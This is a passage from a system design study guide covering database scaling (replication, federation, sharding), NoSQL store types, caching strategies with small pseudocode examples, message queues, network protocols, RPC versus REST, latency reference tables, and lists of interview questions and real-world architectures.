reads.\nThe more read slaves, the more you have to replicate, which leads to greater replication lag.\nOn some systems, writing to the master can spawn multiple threads to write in parallel, whereas read replicas only support writing sequentially with a single thread.\nReplication adds more hardware and additional complexity.\n\nSource(s) and further reading: replication\n\nScalability, availability, stability, patterns\nMulti-master replication\n\nFederation\n\n\n\nSource: Scaling up to your first 10 million users\n\nFederation (or functional partitioning) splits up databases by function.  For example, instead of a single, monolithic database, you could have three databases: forums, users, and products, resulting in less read and write traffic to each database and therefore less replication lag.  Smaller databases result in more data that can fit in memory, which in turn results in more cache hits due to improved cache locality.  With no single central master serializing writes you can write in parallel, increasing throughput.\nDisadvantage(s): federation\n\nFederation is not effective if your schema requires huge functions or tables.\nYou'll need to update your application logic to determine which database to read and write.\nJoining data from two databases is more complex with a server link.\nFederation adds more hardware and additional complexity.\n\nSource(s) and further reading: federation\n\nScaling up to your first 10 million users\n\nSharding\n\n\n\nSource: Scalability, availability, stability, patterns\n\nSharding distributes data across different databases such that each database can only manage a subset of the data.  Taking a users database as an example, as the number of users increases, more shards are added to the cluster.\nSimilar to the advantages of federation, sharding results in less read and write traffic, less replication, and more cache hits.  Index size is also reduced, which generally improves performance with faster queries.  If one shard goes down, the other shards are still operational, although you'll want to add some form of replication to avoid data loss.  Like federation, there is no single central master serializing writes, allowing you to write in parallel with increased throughput.\nCommon ways to shard a table of users is either through the user's last name initial or the user's geographic location.\nDisadvantage(s): sharding\n\nYou'll need to update your application logic to work with shards, which could result in complex SQL queries.\nData distribution can become lopsided in a shard.  For example, a set of power users on a shard could result in increased load to that shard compared to others.\n\nRebalancing adds additional complexity.  A sharding function based on consistent hashing can reduce the amount of transferred data.\n\n\nJoining data from multiple shards is more complex.\nSharding adds more hardware and additional complexity.\n\nSource(s) and further reading: sharding\n\nThe coming of the shard\nShard database architecture\nConsistent hashing\n\nDenormalization\nDenormalization attempts to improve read performance at the expense of some write performance.  Redundant copies of the data are written in multiple tables to avoid expensive joins.  Some RDBMS such as PostgreSQL and Oracle support materialized views which handle the work of storing redundant information and keeping redundant copies consistent.\nOnce data becomes distributed with techniques such as federation and sharding, managing joins across data centers further increases complexity.  Denormalization might circumvent the need for such complex joins.\nIn most systems, reads can heavily outnumber writes 100:1 or even 1000:1.  A read resulting in a complex database join can be very expensive, spending a significant amount of time on disk operations.\nDisadvantage(s): denormalization\n\nData is duplicated.\nConstraints can help redundant copies of information stay in sync, which increases complexity of the database design.\nA denormalized database under heavy write load might perform worse than its normalized counterpart.\n\nSource(s) and further reading: denormalization\n\nDenormalization\n\nSQL tuning\nSQL tuning is a broad topic and many books have been written as reference.\nIt's important to benchmark and profile to simulate and uncover bottlenecks.\n\nBenchmark - Simulate high-load situations with tools such as ab.\nProfile - Enable tools such as the slow query log to help track performance issues.\n\nBenchmarking and profiling might point you to the following optimizations.\nTighten up the schema\n\nMySQL dumps to disk in contiguous blocks for fast access.\nUse CHAR instead of VARCHAR for fixed-length fields.\n\nCHAR effectively allows for fast, random access, whereas with VARCHAR, you must find the end of a string before moving onto the next one.\n\n\nUse TEXT for large blocks of text such as blog posts.  TEXT also allows for boolean searches.  Using a TEXT field results in storing a pointer on disk that is used to locate the text block.\nUse INT for larger numbers up to 2^32 or 4 billion.\nUse DECIMAL for currency to avoid floating point representation errors.\nAvoid storing large BLOBS, store the location of where to get the object instead.\nVARCHAR(255) is the largest number of characters that can be counted in an 8 bit number, often maximizing the use of a byte in some RDBMS.\nSet the NOT NULL constraint where applicable to improve search performance.\n\nUse good indices\n\nColumns that you are querying (SELECT, GROUP BY, ORDER BY, JOIN) could be faster with indices.\nIndices are usually represented as self-balancing B-tree that keeps data sorted and allows searches, sequential access, insertions, and deletions in logarithmic time.\nPlacing an index can keep the data in memory, requiring more space.\nWrites could also be slower since the index also needs to be updated.\nWhen loading large amounts of data, it might be faster to disable indices, load the data, then rebuild the indices.\n\nAvoid expensive joins\n\nDenormalize where performance demands it.\n\nPartition tables\n\nBreak up a table by putting hot spots in a separate table to help keep it in memory.\n\nTune the query cache\n\nIn some cases, the query cache could lead to performance issues.\n\nSource(s) and further reading: SQL tuning\n\nTips for optimizing MySQL queries\nIs there a good reason i see VARCHAR(255) used so often?\nHow do null values affect performance?\nSlow query log\n\nNoSQL\nNoSQL is a collection of data items represented in a key-value store, document store, wide column store, or a graph database.  Data is denormalized, and joins are generally done in the application code.  Most NoSQL stores lack true ACID transactions and favor eventual consistency.\nBASE is often used to describe the properties of NoSQL databases.  In comparison with the CAP Theorem, BASE chooses availability over consistency.\n\nBasically available - the system guarantees availability.\nSoft state - the state of the system may change over time, even without input.\nEventual consistency - the system will become consistent over a period of time, given that the system doesn't receive input during that period.\n\nIn addition to choosing between SQL or NoSQL, it is helpful to understand which type of NoSQL database best fits your use case(s).  We'll review key-value stores, document stores, wide column stores, and graph databases in the next section.\nKey-value store\n\nAbstraction: hash table\n\nA key-value store generally allows for O(1) reads and writes and is often backed by memory or SSD.  Data stores can maintain keys in lexicographic order, allowing efficient retrieval of key ranges.  Key-value stores can allow for storing of metadata with a value.\nKey-value stores provide high performance and are often used for simple data models or for rapidly-changing data, such as an in-memory cache layer.  Since they offer only a limited set of operations, complexity is shifted to the application layer if additional operations are needed.\nA key-value store is the basis for more complex systems such as a document store, and in some cases, a graph database.\nSource(s) and further reading: key-value store\n\nKey-value database\nDisadvantages of key-value stores\nRedis architecture\nMemcached architecture\n\nDocument store\n\nAbstraction: key-value store with documents stored as values\n\nA document store is centered around documents (XML, JSON, binary, etc), where a document stores all information for a given object.  Document stores provide APIs or a query language to query based on the internal structure of the document itself.  Note, many key-value stores include features for working with a value's metadata, blurring the lines between these two storage types.\nBased on the underlying implementation, documents are organized by collections, tags, metadata, or directories.  Although documents can be organized or grouped together, documents may have fields that are completely different from each other.\nSome document stores like MongoDB and CouchDB also provide a SQL-like language to perform complex queries.  DynamoDB supports both key-values and documents.\nDocument stores provide high flexibility and are often used for working with occasionally changing data.\nSource(s) and further reading: document store\n\nDocument-oriented database\nMongoDB architecture\nCouchDB architecture\nElasticsearch architecture\n\nWide column store\n\n\n\nSource: SQL & NoSQL, a brief history\n\n\nAbstraction: nested map ColumnFamily<RowKey, Columns<ColKey, Value, Timestamp>>\n\nA wide column store's basic unit of data is a column (name/value pair).  A column can be grouped in column families (analogous to a SQL table).  Super column families further group column families.  You can access each column independently with a row key, and columns with the same row key form a row.  Each value contains a timestamp for versioning and for conflict resolution.\nGoogle introduced Bigtable as the first wide column store, which influenced the open-source HBase often-used in the Hadoop ecosystem, and Cassandra from Facebook.  Stores such as BigTable, HBase, and Cassandra maintain keys in lexicographic order, allowing efficient retrieval of selective key ranges.\nWide column stores offer high availability and high scalability.  They are often used for very large data sets.\nSource(s) and further reading: wide column store\n\nSQL & NoSQL, a brief history\nBigtable architecture\nHBase architecture\nCassandra architecture\n\nGraph database\n\n\n\nSource: Graph database\n\n\nAbstraction: graph\n\nIn a graph database, each node is a record and each arc is a relationship between two nodes.  Graph databases are optimized to represent complex relationships with many foreign keys or many-to-many relationships.\nGraphs databases offer high performance for data models with complex relationships, such as a social network.  They are relatively new and are not yet widely-used; it might be more difficult to find development tools and resources.  Many graphs can only be accessed with REST APIs.\nSource(s) and further reading: graph\n\nGraph database\nNeo4j\nFlockDB\n\nSource(s) and further reading: NoSQL\n\nExplanation of base terminology\nNoSQL databases a survey and decision guidance\nScalability\nIntroduction to NoSQL\nNoSQL patterns\n\nSQL or NoSQL\n\n\n\nSource: Transitioning from RDBMS to NoSQL\n\nReasons for SQL:\n\nStructured data\nStrict schema\nRelational data\nNeed for complex joins\nTransactions\nClear patterns for scaling\nMore established: developers, community, code, tools, etc\nLookups by index are very fast\n\nReasons for NoSQL:\n\nSemi-structured data\nDynamic or flexible schema\nNon-relational data\nNo need for complex joins\nStore many TB (or PB) of data\nVery data intensive workload\nVery high throughput for IOPS\n\nSample data well-suited for NoSQL:\n\nRapid ingest of clickstream and log data\nLeaderboard or scoring data\nTemporary data, such as a shopping cart\nFrequently accessed ('hot') tables\nMetadata/lookup tables\n\nSource(s) and further reading: SQL or NoSQL\n\nScaling up to your first 10 million users\nSQL vs NoSQL differences\n\nCache\n\n\n\nSource: Scalable system design patterns\n\nCaching improves page load times and can reduce the load on your servers and databases.  In this model, the dispatcher will first lookup if the request has been made before and try to find the previous result to return, in order to save the actual execution.\nDatabases often benefit from a uniform distribution of reads and writes across its partitions.  Popular items can skew the distribution, causing bottlenecks.  Putting a cache in front of a database can help absorb uneven loads and spikes in traffic.\nClient caching\nCaches can be located on the client side (OS or browser), server side, or in a distinct cache layer.\nCDN caching\nCDNs are considered a type of cache.\nWeb server caching\nReverse proxies and caches such as Varnish can serve static and dynamic content directly.  Web servers can also cache requests, returning responses without having to contact application servers.\nDatabase caching\nYour database usually includes some level of caching in a default configuration, optimized for a generic use case.  Tweaking these settings for specific usage patterns can further boost performance.\nApplication caching\nIn-memory caches such as Memcached and Redis are key-value stores between your application and your data storage.  Since the data is held in RAM, it is much faster than typical databases where data is stored on disk.  RAM is more limited than disk, so cache invalidation algorithms such as least recently used (LRU) can help invalidate 'cold' entries and keep 'hot' data in RAM.\nRedis has the following additional features:\n\nPersistence option\nBuilt-in data structures such as sorted sets and lists\n\nThere are multiple levels you can cache that fall into two general categories: database queries and objects:\n\nRow level\nQuery-level\nFully-formed serializable objects\nFully-rendered HTML\n\nGenerally, you should try to avoid file-based caching, as it makes cloning and auto-scaling more difficult.\nCaching at the database query level\nWhenever you query the database, hash the query as a key and store the result to the cache.  This approach suffers from expiration issues:\n\nHard to delete a cached result with complex queries\nIf one piece of data changes such as a table cell, you need to delete all cached queries that might include the changed cell\n\nCaching at the object level\nSee your data as an object, similar to what you do with your application code.  Have your application assemble the dataset from the database into a class instance or a data structure(s):\n\nRemove the object from cache if its underlying data has changed\nAllows for asynchronous processing: workers assemble objects by consuming the latest cached object\n\nSuggestions of what to cache:\n\nUser sessions\nFully rendered web pages\nActivity streams\nUser graph data\n\nWhen to update the cache\nSince you can only store a limited amount of data in cache, you'll need to determine which cache update strategy works best for your use case.\nCache-aside\n\n\n\nSource: From cache to in-memory data grid\n\nThe application is responsible for reading and writing from storage.  The cache does not interact with storage directly.  The application does the following:\n\nLook for entry in cache, resulting in a cache miss\nLoad entry from the database\nAdd entry to cache\nReturn entry\n\ndef get_user(self, user_id):\n    user = cache.get(\"user.{0}\", user_id)\n    if user is None:\n        user = db.query(\"SELECT * FROM users WHERE user_id = {0}\", user_id)\n        if user is not None:\n            key = \"user.{0}\".format(user_id)\n            cache.set(key, json.dumps(user))\n    return user\nMemcached is generally used in this manner.\nSubsequent reads of data added to cache are fast.  Cache-aside is also referred to as lazy loading.  Only requested data is cached, which avoids filling up the cache with data that isn't requested.\nDisadvantage(s): cache-aside\n\nEach cache miss results in three trips, which can cause a noticeable delay.\nData can become stale if it is updated in the database.  This issue is mitigated by setting a time-to-live (TTL) which forces an update of the cache entry, or by using write-through.\nWhen a node fails, it is replaced by a new, empty node, increasing latency.\n\nWrite-through\n\n\n\nSource: Scalability, availability, stability, patterns\n\nThe application uses the cache as the main data store, reading and writing data to it, while the cache is responsible for reading and writing to the database:\n\nApplication adds/updates entry in cache\nCache synchronously writes entry to data store\nReturn\n\nApplication code:\nset_user(12345, {\"foo\":\"bar\"})\nCache code:\ndef set_user(user_id, values):\n    user = db.query(\"UPDATE Users WHERE id = {0}\", user_id, values)\n    cache.set(user_id, user)\nWrite-through is a slow overall operation due to the write operation, but subsequent reads of just written data are fast.  Users are generally more tolerant of latency when updating data than reading data.  Data in the cache is not stale.\nDisadvantage(s): write through\n\nWhen a new node is created due to failure or scaling, the new node will not cache entries until the entry is updated in the database.  Cache-aside in conjunction with write through can mitigate this issue.\nMost data written might never be read, which can be minimized with a TTL.\n\nWrite-behind (write-back)\n\n\n\nSource: Scalability, availability, stability, patterns\n\nIn write-behind, the application does the following:\n\nAdd/update entry in cache\nAsynchronously write entry to the data store, improving write performance\n\nDisadvantage(s): write-behind\n\nThere could be data loss if the cache goes down prior to its contents hitting the data store.\nIt is more complex to implement write-behind than it is to implement cache-aside or write-through.\n\nRefresh-ahead\n\n\n\nSource: From cache to in-memory data grid\n\nYou can configure the cache to automatically refresh any recently accessed cache entry prior to its expiration.\nRefresh-ahead can result in reduced latency vs read-through if the cache can accurately predict which items are likely to be needed in the future.\nDisadvantage(s): refresh-ahead\n\nNot accurately predicting which items are likely to be needed in the future can result in reduced performance than without refresh-ahead.\n\nDisadvantage(s): cache\n\nNeed to maintain consistency between caches and the source of truth such as the database through cache invalidation.\nCache invalidation is a difficult problem, there is additional complexity associated with when to update the cache.\nNeed to make application changes such as adding Redis or memcached.\n\nSource(s) and further reading\n\nFrom cache to in-memory data grid\nScalable system design patterns\nIntroduction to architecting systems for scale\nScalability, availability, stability, patterns\nScalability\nAWS ElastiCache strategies\nWikipedia\n\nAsynchronism\n\n\n\nSource: Intro to architecting systems for scale\n\nAsynchronous workflows help reduce request times for expensive operations that would otherwise be performed in-line.  They can also help by doing time-consuming work in advance, such as periodic aggregation of data.\nMessage queues\nMessage queues receive, hold, and deliver messages.  If an operation is too slow to perform inline, you can use a message queue with the following workflow:\n\nAn application publishes a job to the queue, then notifies the user of job status\nA worker picks up the job from the queue, processes it, then signals the job is complete\n\nThe user is not blocked and the job is processed in the background.  During this time, the client might optionally do a small amount of processing to make it seem like the task has completed.  For example, if posting a tweet, the tweet could be instantly posted to your timeline, but it could take some time before your tweet is actually delivered to all of your followers.\nRedis is useful as a simple message broker but messages can be lost.\nRabbitMQ is popular but requires you to adapt to the 'AMQP' protocol and manage your own nodes.\nAmazon SQS is hosted but can have high latency and has the possibility of messages being delivered twice.\nTask queues\nTasks queues receive tasks and their related data, runs them, then delivers their results.  They can support scheduling and can be used to run computationally-intensive jobs in the background.\nCelery has support for scheduling and primarily has python support.\nBack pressure\nIf queues start to grow significantly, the queue size can become larger than memory, resulting in cache misses, disk reads, and even slower performance.  Back pressure can help by limiting the queue size, thereby maintaining a high throughput rate and good response times for jobs already in the queue.  Once the queue fills up, clients get a server busy or HTTP 503 status code to try again later.  Clients can retry the request at a later time, perhaps with exponential backoff.\nDisadvantage(s): asynchronism\n\nUse cases such as inexpensive calculations and realtime workflows might be better suited for synchronous operations, as introducing queues can add delays and complexity.\n\nSource(s) and further reading\n\nIt's all a numbers game\nApplying back pressure when overloaded\nLittle's law\nWhat is the difference between a message queue and a task queue?\n\nCommunication\n\n\n\nSource: OSI 7 layer model\n\nHypertext transfer protocol (HTTP)\nHTTP is a method for encoding and transporting data between a client and a server.  It is a request/response protocol: clients issue requests and servers issue responses with relevant content and completion status info about the request.  HTTP is self-contained, allowing requests and responses to flow through many intermediate routers and servers that perform load balancing, caching, encryption, and compression.\nA basic HTTP request consists of a verb (method) and a resource (endpoint).  Below are common HTTP verbs:\n\n\n\nVerb\nDescription\nIdempotent*\nSafe\nCacheable\n\n\n\n\nGET\nReads a resource\nYes\nYes\nYes\n\n\nPOST\nCreates a resource or trigger a process that handles data\nNo\nNo\nYes if response contains freshness info\n\n\nPUT\nCreates or replace a resource\nYes\nNo\nNo\n\n\nPATCH\nPartially updates a resource\nNo\nNo\nYes if response contains freshness info\n\n\nDELETE\nDeletes a resource\nYes\nNo\nNo\n\n\n\n*Can be called many times without different outcomes.\nHTTP is an application layer protocol relying on lower-level protocols such as TCP and UDP.\nSource(s) and further reading: HTTP\n\nWhat is HTTP?\nDifference between HTTP and TCP\nDifference between PUT and PATCH\n\nTransmission control protocol (TCP)\n\n\n\nSource: How to make a multiplayer game\n\nTCP is a connection-oriented protocol over an IP network.  Connection is established and terminated using a handshake.  All packets sent are guaranteed to reach the destination in the original order and without corruption through:\n\nSequence numbers and checksum fields for each packet\nAcknowledgement packets and automatic retransmission\n\nIf the sender does not receive a correct response, it will resend the packets.  If there are multiple timeouts, the connection is dropped.  TCP also implements flow control and congestion control.  These guarantees cause delays and generally result in less efficient transmission than UDP.\nTo ensure high throughput, web servers can keep a large number of TCP connections open, resulting in high memory usage.  It can be expensive to have a large number of open connections between web server threads and say, a memcached server.  Connection pooling can help in addition to switching to UDP where applicable.\nTCP is useful for applications that require high reliability but are less time critical.  Some examples include web servers, database info, SMTP, FTP, and SSH.\nUse TCP over UDP when:\n\nYou need all of the data to arrive intact\nYou want to automatically make a best estimate use of the network throughput\n\nUser datagram protocol (UDP)\n\n\n\nSource: How to make a multiplayer game\n\nUDP is connectionless.  Datagrams (analogous to packets) are guaranteed only at the datagram level.  Datagrams might reach their destination out of order or not at all.  UDP does not support congestion control.  Without the guarantees that TCP support, UDP is generally more efficient.\nUDP can broadcast, sending datagrams to all devices on the subnet.  This is useful with DHCP because the client has not yet received an IP address, thus preventing a way for TCP to stream without the IP address.\nUDP is less reliable but works well in real time use cases such as VoIP, video chat, streaming, and realtime multiplayer games.\nUse UDP over TCP when:\n\nYou need the lowest latency\nLate data is worse than loss of data\nYou want to implement your own error correction\n\nSource(s) and further reading: TCP and UDP\n\nNetworking for game programming\nKey differences between TCP and UDP protocols\nDifference between TCP and UDP\nTransmission control protocol\nUser datagram protocol\nScaling memcache at Facebook\n\nRemote procedure call (RPC)\n\n\n\nSource: Crack the system design interview\n\nIn an RPC, a client causes a procedure to execute on a different address space, usually a remote server.  The procedure is coded as if it were a local procedure call, abstracting away the details of how to communicate with the server from the client program.  Remote calls are usually slower and less reliable than local calls so it is helpful to distinguish RPC calls from local calls.  Popular RPC frameworks include Protobuf, Thrift, and Avro.\nRPC is a request-response protocol:\n\nClient program - Calls the client stub procedure.  The parameters are pushed onto the stack like a local procedure call.\nClient stub procedure - Marshals (packs) procedure id and arguments into a request message.\nClient communication module - OS sends the message from the client to the server.\nServer communication module - OS passes the incoming packets to the server stub procedure.\nServer stub procedure -  Unmarshalls the results, calls the server procedure matching the procedure id and passes the given arguments.\nThe server response repeats the steps above in reverse order.\n\nSample RPC calls:\nGET /someoperation?data=anId\n\nPOST /anotheroperation\n{\n  \"data\":\"anId\";\n  \"anotherdata\": \"another value\"\n}\n\nRPC is focused on exposing behaviors.  RPCs are often used for performance reasons with internal communications, as you can hand-craft native calls to better fit your use cases.\nChoose a native library (aka SDK) when:\n\nYou know your target platform.\nYou want to control how your \"logic\" is accessed.\nYou want to control how error control happens off your library.\nPerformance and end user experience is your primary concern.\n\nHTTP APIs following REST tend to be used more often for public APIs.\nDisadvantage(s): RPC\n\nRPC clients become tightly coupled to the service implementation.\nA new API must be defined for every new operation or use case.\nIt can be difficult to debug RPC.\nYou might not be able to leverage existing technologies out of the box.  For example, it might require additional effort to ensure RPC calls are properly cached on caching servers such as Squid.\n\nRepresentational state transfer (REST)\nREST is an architectural style enforcing a client/server model where the client acts on a set of resources managed by the server.  The server provides a representation of resources and actions that can either manipulate or get a new representation of resources.  All communication must be stateless and cacheable.\nThere are four qualities of a RESTful interface:\n\nIdentify resources (URI in HTTP) - use the same URI regardless of any operation.\nChange with representations (Verbs in HTTP) - use verbs, headers, and body.\nSelf-descriptive error message (status response in HTTP) - Use status codes, don't reinvent the wheel.\nHATEOAS (HTML interface for HTTP) - your web service should be fully accessible in a browser.\n\nSample REST calls:\nGET /someresources/anId\n\nPUT /someresources/anId\n{\"anotherdata\": \"another value\"}\n\nREST is focused on exposing data.  It minimizes the coupling between client/server and is often used for public HTTP APIs.  REST uses a more generic and uniform method of exposing resources through URIs, representation through headers, and actions through verbs such as GET, POST, PUT, DELETE, and PATCH.  Being stateless, REST is great for horizontal scaling and partitioning.\nDisadvantage(s): REST\n\nWith REST being focused on exposing data, it might not be a good fit if resources are not naturally organized or accessed in a simple hierarchy.  For example, returning all updated records from the past hour matching a particular set of events is not easily expressed as a path.  With REST, it is likely to be implemented with a combination of URI path, query parameters, and possibly the request body.\nREST typically relies on a few verbs (GET, POST, PUT, DELETE, and PATCH) which sometimes doesn't fit your use case.  For example, moving expired documents to the archive folder might not cleanly fit within these verbs.\nFetching complicated resources with nested hierarchies requires multiple round trips between the client and server to render single views, e.g. fetching content of a blog entry and the comments on that entry. For mobile applications operating in variable network conditions, these multiple roundtrips are highly undesirable.\nOver time, more fields might be added to an API response and older clients will receive all new data fields, even those that they do not need, as a result, it bloats the payload size and leads to larger latencies.\n\nRPC and REST calls comparison\n\n\n\nOperation\nRPC\nREST\n\n\n\n\nSignup\nPOST /signup\nPOST /persons\n\n\nResign\nPOST /resign{\"personid\": \"1234\"}\nDELETE /persons/1234\n\n\nRead a person\nGET /readPerson?personid=1234\nGET /persons/1234\n\n\nRead a person\u2019s items list\nGET /readUsersItemsList?personid=1234\nGET /persons/1234/items\n\n\nAdd an item to a person\u2019s items\nPOST /addItemToUsersItemsList{\"personid\": \"1234\";\"itemid\": \"456\"}\nPOST /persons/1234/items{\"itemid\": \"456\"}\n\n\nUpdate an item\nPOST /modifyItem{\"itemid\": \"456\";\"key\": \"value\"}\nPUT /items/456{\"key\": \"value\"}\n\n\nDelete an item\nPOST /removeItem{\"itemid\": \"456\"}\nDELETE /items/456\n\n\n\n\nSource: Do you really know why you prefer REST over RPC\n\nSource(s) and further reading: REST and RPC\n\nDo you really know why you prefer REST over RPC\nWhen are RPC-ish approaches more appropriate than REST?\nREST vs JSON-RPC\nDebunking the myths of RPC and REST\nWhat are the drawbacks of using REST\nCrack the system design interview\nThrift\nWhy REST for internal use and not RPC\n\nSecurity\nThis section could use some updates.  Consider contributing!\nSecurity is a broad topic.  Unless you have considerable experience, a security background, or are applying for a position that requires knowledge of security, you probably won't need to know more than the basics:\n\nEncrypt in transit and at rest.\nSanitize all user inputs or any input parameters exposed to user to prevent XSS and SQL injection.\nUse parameterized queries to prevent SQL injection.\nUse the principle of least privilege.\n\nSource(s) and further reading\n\nSecurity guide for developers\nOWASP top ten\n\nAppendix\nYou'll sometimes be asked to do 'back-of-the-envelope' estimates.  For example, you might need to determine how long it will take to generate 100 image thumbnails from disk or how much memory a data structure will take.  The Powers of two table and Latency numbers every programmer should know are handy references.\nPowers of two table\nPower           Exact Value         Approx Value        Bytes\n---------------------------------------------------------------\n7                             128\n8                             256\n10                           1024   1 thousand           1 KB\n16                         65,536                       64 KB\n20                      1,048,576   1 million            1 MB\n30                  1,073,741,824   1 billion            1 GB\n32                  4,294,967,296                        4 GB\n40              1,099,511,627,776   1 trillion           1 TB\n\nSource(s) and further reading\n\nPowers of two\n\nLatency numbers every programmer should know\nLatency Comparison Numbers\n--------------------------\nL1 cache reference                           0.5 ns\nBranch mispredict                            5   ns\nL2 cache reference                           7   ns                      14x L1 cache\nMutex lock/unlock                           25   ns\nMain memory reference                      100   ns                      20x L2 cache, 200x L1 cache\nCompress 1K bytes with Zippy            10,000   ns       10 us\nSend 1 KB bytes over 1 Gbps network     10,000   ns       10 us\nRead 4 KB randomly from SSD*           150,000   ns      150 us          ~1GB/sec SSD\nRead 1 MB sequentially from memory     250,000   ns      250 us\nRound trip within same datacenter      500,000   ns      500 us\nRead 1 MB sequentially from SSD*     1,000,000   ns    1,000 us    1 ms  ~1GB/sec SSD, 4X memory\nDisk seek                           10,000,000   ns   10,000 us   10 ms  20x datacenter roundtrip\nRead 1 MB sequentially from 1 Gbps  10,000,000   ns   10,000 us   10 ms  40x memory, 10X SSD\nRead 1 MB sequentially from disk    30,000,000   ns   30,000 us   30 ms 120x memory, 30X SSD\nSend packet CA->Netherlands->CA    150,000,000   ns  150,000 us  150 ms\n\nNotes\n-----\n1 ns = 10^-9 seconds\n1 us = 10^-6 seconds = 1,000 ns\n1 ms = 10^-3 seconds = 1,000 us = 1,000,000 ns\n\nHandy metrics based on numbers above:\n\nRead sequentially from disk at 30 MB/s\nRead sequentially from 1 Gbps Ethernet at 100 MB/s\nRead sequentially from SSD at 1 GB/s\nRead sequentially from main memory at 4 GB/s\n6-7 world-wide round trips per second\n2,000 round trips per second within a data center\n\nLatency numbers visualized\n\nSource(s) and further reading\n\nLatency numbers every programmer should know - 1\nLatency numbers every programmer should know - 2\nDesigns, lessons, and advice from building large distributed systems\nSoftware Engineering Advice from Building Large-Scale Distributed Systems\n\nAdditional system design interview questions\n\nCommon system design interview questions, with links to resources on how to solve each.\n\n\n\n\nQuestion\nReference(s)\n\n\n\n\nDesign a file sync service like Dropbox\nyoutube.com\n\n\nDesign a search engine like Google\nqueue.acm.orgstackexchange.comardendertat.comstanford.edu\n\n\nDesign a scalable web crawler like Google\nquora.com\n\n\nDesign Google docs\ncode.google.comneil.fraser.name\n\n\nDesign a key-value store like Redis\nslideshare.net\n\n\nDesign a cache system like Memcached\nslideshare.net\n\n\nDesign a recommendation system like Amazon's\nhulu.comijcai13.org\n\n\nDesign a tinyurl system like Bitly\nn00tc0d3r.blogspot.com\n\n\nDesign a chat app like WhatsApp\nhighscalability.com\n\n\nDesign a picture sharing system like Instagram\nhighscalability.comhighscalability.com\n\n\nDesign the Facebook news feed function\nquora.comquora.comslideshare.net\n\n\nDesign the Facebook timeline function\nfacebook.comhighscalability.com\n\n\nDesign the Facebook chat function\nerlang-factory.comfacebook.com\n\n\nDesign a graph search function like Facebook's\nfacebook.comfacebook.comfacebook.com\n\n\nDesign a content delivery network like CloudFlare\nfigshare.com\n\n\nDesign a trending topic system like Twitter's\nmichael-noll.comsnikolov .wordpress.com\n\n\nDesign a random ID generation system\nblog.twitter.comgithub.com\n\n\nReturn the top k requests during a time interval\ncs.ucsb.eduwpi.edu\n\n\nDesign a system that serves data from multiple data centers\nhighscalability.com\n\n\nDesign an online multiplayer card game\nindieflashblog.combuildnewgames.com\n\n\nDesign a garbage collection system\nstuffwithstuff.comwashington.edu\n\n\nDesign an API rate limiter\nhttps://stripe.com/blog/\n\n\nAdd a system design question\nContribute\n\n\n\nReal world architectures\n\nArticles on how real world systems are designed.\n\n\n\n\nSource: Twitter timelines at scale\n\nDon't focus on nitty gritty details for the following articles, instead:\n\nIdentify shared principles, common technologies, and patterns within these articles\nStudy what problems are solved by each component, where it works, where it doesn't\nReview the lessons learned\n\n\n\n\nType\nSystem\nReference(s)\n\n\n\n\nData processing\nMapReduce - Distributed data processing from Google\nresearch.google.com\n\n\nData processing\nSpark - Distributed data processing from Databricks\nslideshare.net\n\n\nData processing\nStorm - Distributed data processing from Twitter\nslideshare.net\n\n\n\n\n\n\n\nData store\nBigtable - Distributed column-oriented database from Google\nharvard.edu\n\n\nData store\nHBase - Open source implementation of Bigtable\nslideshare.net\n\n\nData store\nCassandra - Distributed column-oriented database from Facebook\nslideshare.net\n\n\nData store\nDynamoDB - Document-oriented database from Amazon\nharvard.edu\n\n\nData store\nMongoDB - Document-oriented database\nslideshare.net\n\n\nData store\nSpanner - Globally-distributed database from Google\nresearch.google.com\n\n\nData store\nMemcached - Distributed memory caching system\nslideshare.net\n\n\nData store\nRedis - Distributed memory caching system with persistence and value types\nslideshare.net\n\n\n\n\n\n\n\nFile system\nGoogle File System (GFS) - Distributed file system\nresearch.google.com\n\n\nFile system\nHadoop File System (HDFS) - Open source implementation of GFS\napache.org\n\n\n\n\n\n\n\nMisc\nChubby - Lock service for loosely-coupled distributed systems from Google\nresearch.google.com\n\n\nMisc\nDapper - Distributed systems tracing infrastructure\nresearch.google.com\n\n\nMisc\nKafka - Pub/sub message queue from LinkedIn\nslideshare.net\n\n\nMisc\nZookeeper - Centralized infrastructure and services enabling synchronization\nslideshare.net\n\n\n\nAdd an architecture\nContribute\n\n\n\nCompany architectures\n\n\n\nCompany\nReference(s)\n\n\n\n\nAmazon\nAmazon architecture\n\n\nCinchcast\nProducing 1,500 hours of audio every day\n\n\nDataSift\nRealtime datamining At 120,000 tweets per second\n\n\nDropBox\nHow we've scaled Dropbox\n\n\nESPN\nOperating At 100,000 duh nuh nuhs per second\n\n\nGoogle\nGoogle architecture\n\n\nInstagram\n14 million users, terabytes of photosWhat powers Instagram\n\n\nJustin.tv\nJustin.Tv's live video broadcasting architecture\n\n\nFacebook\nScaling memcached at FacebookTAO: Facebook\u2019s distributed data store for the social graphFacebook\u2019s photo storageHow Facebook Live Streams To 800,000 Simultaneous Viewers\n\n\nFlickr\nFlickr architecture\n\n\nMailbox\nFrom 0 to one million users in 6 weeks\n\n\nNetflix\nA 360 Degree View Of The Entire Netflix StackNetflix: What Happens When You Press Play?\n\n\nPinterest\nFrom 0 To 10s of billions of page views a month18 million visitors, 10x growth, 12 employees\n\n\nPlayfish\n50 million monthly users and growing\n\n\nPlentyOfFish\nPlentyOfFish architecture\n\n\nSalesforce\nHow they handle 1.3 billion transactions a day\n\n\nStack Overflow\nStack Overflow architecture\n\n\nTripAdvisor\n40M visitors, 200M dynamic page views, 30TB data\n\n\nTumblr\n15 billion page views a month\n\n\nTwitter\nMaking Twitter 10000 percent fasterStoring 250 million tweets a day using MySQL150M active users, 300K QPS, a 22 MB/S firehoseTimelines at scaleBig and small data at TwitterOperations at Twitter: scaling beyond 100 million usersHow Twitter Handles 3,000 Images Per Second\n\n\nUber\nHow Uber scales their real-time market platformLessons Learned From Scaling Uber To 2000 Engineers, 1000 Services, And 8000 Git Repositories\n\n\nWhatsApp\nThe WhatsApp architecture Facebook bought for $19 billion\n\n\nYouTube\nYouTube scalabilityYouTube architecture\n\n\n\nCompany engineering blogs\n\nArchitectures for companies you are interviewing with.\nQuestions you encounter might be from the same domain.\n\n\nAirbnb Engineering\nAtlassian Developers\nAWS Blog\nBitly Engineering Blog\nBox Blogs\nCloudera Developer Blog\nDropbox Tech Blog\nEngineering at Quora\nEbay Tech Blog\nEvernote Tech Blog\nEtsy Code as Craft\nFacebook Engineering\nFlickr Code\nFoursquare Engineering Blog\nGitHub Engineering Blog\nGoogle Research Blog\nGroupon Engineering Blog\nHeroku Engineering Blog\nHubspot Engineering Blog\nHigh Scalability\nInstagram Engineering\nIntel Software Blog\nJane Street Tech 